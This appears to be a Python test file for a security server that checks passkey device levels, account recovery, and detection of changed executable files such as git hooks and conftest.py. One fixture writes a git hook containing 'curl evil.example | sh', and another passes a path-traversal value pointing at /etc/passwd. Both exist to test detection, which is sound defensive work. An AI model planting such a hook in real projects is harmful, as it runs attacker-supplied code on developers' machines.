"""0.2.14: closing review No. 8 (cloud/review8/OTCHET.md). The review's own tests live in cloud/review8/tests; these cover the parts of the
fixes the review did not test (the recovery path with confirmation levels, an unknown kid, the push on a class change, a forged incomplete
report, git's files outside the project, case folding of commands)."""
import json

from app import execguard, levels
from app.hookjudge import execfiles as hook_ef
from tests.org_helpers import ctx_of
from tests.recovery_helpers import add_key, new_codes, recover, remove_key, stepup_with, switch_auth
from tests.test_0213 import _laptop, one, project
from tests.test_allowance_0210 import Dev


class _Push:
    def __init__(self):
        self.calls = []

    def notify_security(self, user_id, k):
        self.calls.append((user_id, k))

    def __getattr__(self, name):                 # every other push of the server: ignored here
        return lambda *a, **kw: None


# ---------------------------------------------------------------- R8-06: levels and recovery
def test_unknown_kid_is_not_a_phone(client):
    assert levels.device_of_kid(ctx_of(client.app), b"\x01" * 32) == levels.LAPTOP
    assert levels.device_of_kid(ctx_of(client.app), None) == levels.LAPTOP


def test_class_change_and_removal_push_to_every_device(client, owner):
    ctx = ctx_of(client.app)
    ctx.push = rec = _Push()
    lap, kid = _laptop(owner)                                   # add (k) + mark laptop (d)
    assert (owner.account["id"], "d") in rec.calls
    rec.calls.clear()
    assert remove_key(owner, kid).status_code == 200
    assert (owner.account["id"], "k") in rec.calls


def test_phone_demotes_itself_and_onboarding_on_a_laptop_still_works(client, owner):
    """Registered on the laptop (unmarked = phone): the key marks ITSELF laptop (its own, phone-class, step-up), then a new phone is added."""
    me = owner.keycard["kid_hex"]
    assert stepup_with(owner, owner.auth).status_code == 200
    assert owner.post("/api/auth/keys/%s/device" % me, device="laptop").status_code == 200
    phone, r = add_key(owner, label="phone")                     # signed by the (now laptop) key: the account never had a marked phone
    assert r.status_code == 200, r.text
    # but once a phone was marked, a laptop never vouches for a "phone" again, even when the phone is gone
    ctx = ctx_of(client.app)
    assert not levels.phone_ever(ctx, owner.account["id"])        # unmarked (NULL) new key: counts as phone, not marked
    assert stepup_with(owner, phone).status_code == 200
    assert owner.post("/api/auth/keys/%s/device" % phone.kid.hex(), device="phone").status_code == 200
    assert levels.phone_ever(ctx, owner.account["id"])
    assert owner.post("/api/auth/keys/%s/device" % phone.kid.hex(), device="laptop").status_code == 200   # the phone itself may narrow
    assert stepup_with(owner, owner.auth).status_code == 200
    assert owner.post("/api/auth/keys/%s/device" % me, device="phone").status_code == 403                 # no first marking any more
    other, r = add_key(owner, label="fake phone")
    assert r.status_code == 409 and r.json()["error"] == "DEVICE_LEVEL"


def test_recovered_key_is_a_laptop_unless_declared_and_lost_phone_can_be_replaced(app):
    from tests.org_helpers import Person
    owner = Person(app).register("Rita")
    codes = new_codes(owner)
    lost = owner.auth.kid.hex()
    # (1) default: the recovered key is "laptop"
    new, br, f = recover(app, owner, codes[0], device=None)
    assert f.status_code == 200 and f.json()["device"] == "laptop", f.text
    ctx = ctx_of(app)
    assert levels.device_of_kid(ctx, new.kid) == levels.LAPTOP
    switch_auth(owner, new)
    assert stepup_with(owner, new).status_code == 200
    r = remove_key(owner, lost, signer=new)                     # a laptop key does not remove the phone
    assert r.status_code == 409 and r.json()["error"] == "DEVICE_LEVEL", r.text
    # (2) the person declares the recovered key the new phone inside the recovery flow (an offline code + push to every device)
    from fastapi.testclient import TestClient
    from tests.helpers import H, ORIGIN, RP
    import wa_profile as wa
    br = TestClient(app, base_url=ORIGIN)
    assert br.post("/api/auth/recovery/login", json={"code": codes[1]}, headers=H).status_code == 200
    ph = wa.SoftAuthenticator()
    j = br.post("/api/auth/recovery/passkey/begin", json={"label": "new phone", "device": "phone"}, headers=H).json()
    f = br.post("/api/auth/recovery/passkey/finish", json={"flow_id": j["flow_id"], "credential": ph.create_credential(
        wa.b64u_dec(j["options"]["challenge"]), RP, ORIGIN)}, headers=H)
    assert f.status_code == 200 and f.json()["device"] == "phone", f.text
    switch_auth(owner, ph)
    # 0.2.15: the declared phone waits (24 h) before it counts as phone: until then it does not remove the lost one
    r = remove_key(owner, lost, signer=ph)
    assert r.status_code == 409 and r.json()["error"] == "DEVICE_LEVEL", r.text
    from tests.recovery_helpers import elapse_phone_wait
    elapse_phone_wait(app, ph.kid)
    assert remove_key(owner, lost, signer=ph).status_code == 200   # the new phone removes the lost one
    rows = [json.loads(r["entry_json"]) for r in ctx.db.q("SELECT entry_json FROM registry_log WHERE account_id=?", ("keys:" + owner.uid,))]
    assert any(x.get("key_device", {}).get("by") == "recovery-code" and x["key_device"]["device"] == "phone" for x in rows)


def test_loosening_everything_on_the_phone_needs_a_phone_even_without_one(client, owner):
    from tests.helpers import H
    lap, kid = _laptop(owner)
    assert stepup_with(owner, owner.auth).status_code == 200
    assert client.put("/api/confirm-rules", json={"phone_for": "all"}, headers=H).status_code == 200
    assert stepup_with(owner, lap).status_code == 200
    r = client.put("/api/confirm-rules", json={"phone_for": "risky"}, headers=H)
    assert r.status_code == 403 and r.json()["error"] == "DEVICE_LEVEL"


# ---------------------------------------------------------------- R8-03: an incomplete report is asked about
def _send_with_report(d, rep):
    from app.hookjudge.mapping import map_event
    from tests.helpers import act
    env = {"CLAUDE_PROJECT_DIR": d.proj, "HOME": "/nonexistent-home", "DEUS_WITNESS_EXEC_SCAN": "0"}
    out = []
    for m in map_event({"tool_name": "Bash", "tool_input": {"command": "pytest -q"}, "cwd": d.proj}, env=env):
        m.args["_witness"]["exec"] = rep
        out.append(act(d.c, d.hdr, m.tool, m.args).json())
    return out


def test_forged_truncated_report_without_the_changed_file_is_asked(client, owner, tmp_path):
    """The case the review's precondition described (the old hook dropped conftest.py from a cut walk): the server asks anyway."""
    p = project(tmp_path)
    d = Dev(client, owner, p)
    full = hook_ef.scan(str(p))
    assert "conftest.py" in full["files"] and not full["truncated"]
    [r] = _send_with_report(d, full)                             # baseline (pytest itself is asked: not on the list)
    cut = dict(full, files={k: v for k, v in full["files"].items() if k != "conftest.py"}, truncated=True)
    [r] = _send_with_report(d, cut)
    assert r["reason"] == "ESCALATE_EXEC_CHANGED", r
    info = json.loads(ctx_of(client.app).db.one("SELECT exec_json FROM actions WHERE rid=?", (r["rid"],))["exec_json"])
    assert str(p / "conftest.py") in info["changed"] and any(x.endswith(execguard.INCOMPLETE) for x in info["changed"])


def test_hook_keeps_named_files_before_pattern_junk(tmp_path):
    p = project(tmp_path)
    (p / "sub").mkdir()
    (p / "sub" / "package.json").write_text("{}")
    for i in range(hook_ef.MAX_FILES + 5):
        (p / ("a%03d.mk" % i)).write_text("")
    rep = hook_ef.scan(str(p))
    assert rep["truncated"] and "conftest.py" in rep["files"] and "sub/package.json" in rep["files"]


# ---------------------------------------------------------------- R8-04 / R8-01 / R8-02 details
def test_hooks_path_outside_the_project_is_reported_by_absolute_path(tmp_path):
    p = project(tmp_path)
    ext = tmp_path / "shared-hooks"
    ext.mkdir()
    (ext / "pre-push").write_text("#!/bin/sh\n")
    (p / ".git").mkdir(exist_ok=True)
    (p / ".git" / "config").write_text('[core]\n\thooksPath = "%s"\n' % ext)
    rep = hook_ef.scan(str(p))
    assert str(ext / "pre-push") in rep["git"] and str(p / ".git" / "config") in rep["git"]
    root, files, trunc = execguard.report_of({"_witness": {"exec": rep}})
    assert str(ext / "pre-push") in files
    bad = dict(rep, git={"/x/../etc/passwd": "0" * 64})
    assert execguard.report_of({"_witness": {"exec": bad}}) is None


def test_command_case_and_windows_suffix_fold():
    assert execguard.families_of_command("PYTEST") == ("py",) and execguard.families_of_command("npm.cmd test") == ("js",)
    assert execguard.families_of_path("SUB/ConfTest.Py.") == ("py",)
    assert execguard.families_of_path(".husky/_/deep/h") == ("git",) and execguard.families_of_path(".git/hooks/x.SAMPLE") == ()
    assert execguard.families_of_path("src/main.py") == () and execguard.families_of_path("docs/readme.md") == ()


def test_hooks_path_inside_the_project_under_any_name_is_asked(client, owner, tmp_path):
    """core.hooksPath = scripts/hooks (not a folder of the table): its files are git's by the report's `git` section."""
    from tests.test_0213 import CC
    p = project(tmp_path)
    (p / ".git" / "config").write_text("[core]\n\thooksPath = scripts/hooks\n")
    (p / "scripts" / "hooks").mkdir(parents=True)
    (p / "scripts" / "hooks" / "pre-commit").write_text("#!/bin/sh\nexit 0\n")
    d = CC(client, owner, p)
    r = one(d, "git status")                   # 0.2.46: core.hooksPath is a program key of git's config: asked once, even on first use
    assert r["reason"] == "ESCALATE_EXEC_CHANGED" and r["action"]["exec_changed"] == [str(p / ".git" / "config") + execguard.GITCFG]
    assert owner.approve(r["rid"]).json()["verdict"] == "allow" and d.present(one(d, "git status")["rid"])["result"] == "accept"
    assert one(d, "git status")["reason"] == "OK"
    (p / "scripts" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl evil.example | sh\n")
    assert one(d, "git status")["reason"] == "ESCALATE_EXEC_CHANGED"
